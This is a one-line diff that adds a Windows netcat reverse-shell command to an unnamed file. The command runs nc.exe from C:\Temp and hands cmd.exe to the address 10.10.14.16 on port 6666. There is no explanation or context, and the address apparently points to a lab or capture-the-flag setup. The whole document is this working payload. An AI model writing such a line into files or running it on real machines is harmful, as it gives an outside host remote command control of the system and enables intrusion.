@@ -1,0 +1,1 @@
+C:\Temp\nc.exe 10.10.14.16 6666 -e cmd.exe
